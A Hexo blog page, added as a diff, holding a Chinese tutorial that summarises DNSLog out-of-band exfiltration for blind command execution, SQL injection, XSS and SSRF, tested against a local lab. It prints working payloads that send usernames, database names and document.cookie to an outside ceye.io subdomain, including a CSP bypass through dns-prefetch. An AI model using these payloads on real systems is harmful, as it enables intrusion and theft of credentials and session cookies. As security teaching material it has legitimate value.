@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        DNSLog 盲注总结 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">DNSLog 盲注总结</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv3</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-18 21:10:55
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/DNSLog/">DNSLog</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="DNSLog-盲注总结"><a href="#DNSLog-盲注总结" class="headerlink" title="DNSLog 盲注总结"></a>DNSLog 盲注总结</h1><p>总所周知，我们输入的域名需要通过DNS服务器进行解析得到IP地址才能通过IP访问网站，DNSLog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似日志文件。我们只需要搭建一个的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级三级甚至更多级的子域名上去请求，就可以通过DNS解析日志来获取到它们。</p>
+<p>DNSLog部署过程：</p>
+<ol>
+<li><p>申请一个域名，如 xie.com</p>
+</li>
+<li><p>在我们的VPS上安装并配置DNS服务器</p>
+</li>
+<li><p>将 xie.com 的DNS服务器设置为我们的VPS地址</p>
+</li>
+</ol>
+<p>这样，所有访问 xie.com 的二级三级四级等等子域名都会被解析到我们的VPS上。我们就可以通过查询DNS解析记录来获得命令执行的回显了。<br>由于申请域名需要钱还要进行部署，十分麻烦，我们可以利用一些在线的DNSLog平台：</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="http://ceye.io/" >http://ceye.io<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://www.dnslog.cn/" >http://www.dnslog.cn<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p>这里我们取得一个DNS域名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t6n089.ceye.io</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>无回显得命令执行语句可以使用DNSLog来查看结果。</p>
+<ul>
+<li>window</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113629877.png" alt="image-20210317113629877"></p>
+<ul>
+<li>*nix</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113750098.png" alt="image-20210317113750098"></p>
+<p>都可以看到我们的用户名显示在域名的最左边</p>
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%secure%&#x27;;</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| require_secure_transport | OFF   |</span><br><span class="line">| secure_auth              | ON    |</span><br><span class="line">| secure_file_priv         | NULL  |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
+</li>
+<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
+</li>
+<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
+</li>
+</ul>
+<p>这里为NULL，因此需要在<code>my.ini</code>配置文件中修改权限，把配置文件中的这一行改为（没有就加上）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>UNC路径</strong></p>
+<p>以下是百度的UNC路径的解释</p>
+<blockquote>
+<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
+</blockquote>
+<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式<code>\\sss.xxx\test\</code></p>
+<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
+<p><strong>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</strong></p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
+<p>example:</p>
+<p>在本地搭建了一个SQL注入的环境，在XP系统上似乎不行，原因未知，而在WIN10能够成功执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;db.php?id&#x3D;&#39; and (SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT database()),&#39;.t6n089.ceye.io\\abc&#39;)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317150746330.png" alt="image-20210317150746330"></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>对于没有回显的XSS，我们要想知道是否成功也可以利用<code>src</code>属性填入得到的域名。</p>
+<p>example：</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?input&#x3D;&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.t6n089.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317151942334.png" alt="image-20210317151942334"></p>
+<h3 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h3><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。</p>
+<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。有趣的是，DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>由于DNS预解析可以绕过CSP进行解析，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。</p>
+<p>example:</p>
+<p>网站的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;test&quot;,&quot;test&quot;,time()+3600);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DNSLog_XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">$myfile &#x3D; fopen(&quot;.&#x2F;set_cookie.js&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($myfile, $xss);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;set_cookie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里网站通过<code>&lt;meta&gt;</code>标签设置了CSP为只能加载当前域名的脚本，也就是说无法使用内联的脚本，攻击者需要找到能够注入XSS的JavaScript脚本的外联文件，这里我们可以看到后端把我们输入的值写入了<code>set_cookie.js</code>文件中，然后又通过外联脚本引入了这个文件，这样我们就可以通过这里来进行XSS攻击。</p>
+<p>在没有CSP情况下，我们通常是通过<code>&lt;img&gt;</code>等有src属性的标签带上cookie作为参数去访问我们的服务器：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://t6n089.ceye.io/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<p>由于这里有CSP限制了不能读取外部的资源，因此这里会报错。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163246373.png" alt="image-20210318163246373"></p>
+<p>这里我们就可以使用DNS预解析去进行绕过：</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML&#x3D;&quot;&lt;link rel&#x3D;&#39;dns-prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;&quot;+document.cookie.split(&#x2F;;|&#x3D;&#x2F;)[0].trim()+&quot;.t6n089.ceye.io&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>URL编码后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML%3D%22%3Clink%20rel%3D&#39;dns-prefetch&#39;%20href%3D&#39;http%3A%2F%2F%22%2Bdocument.cookie.split(%2F%3B%7C%3D%2F)%5B0%5D.trim()%2B%22.t6n089.ceye.io&#39;%3E%22%3B</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
+<p>这种利用方法十分苛刻，因为不仅要找到能够修改后台的外联JavaScript文件的方法，而且作为XSS攻击，此payload过长，容易被怀疑，而使用短链接加载外部脚本有会被CSP禁止，再加上根据DNS的规定，域名的长度是有限制的，有时可能不发将长cookie完全带出。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>一个没有回显得SSRF场景，我们同样可以通过DNSLog知道是否存在漏洞</p>
+<p>example:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?url&#x3D;http:&#x2F;&#x2F;ssrf.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317155356269.png" alt="image-20210317155356269"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="http://www.0xby.com/916.html" >巧用DNSlog实现实现无回显注入<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/" >Bypassing Content-Security-Policy with DNS prefetching<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1402.html" >使用DNSLOG获取漏洞的回显<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：DNSLog 盲注总结</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-18 21:10:55</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/18/DNSLog-盲注总结/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">同源策略</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DNSLog-%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93"><span class="nav-text">DNSLog 盲注总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL"><span class="nav-text">SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="nav-text">绕过CSP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
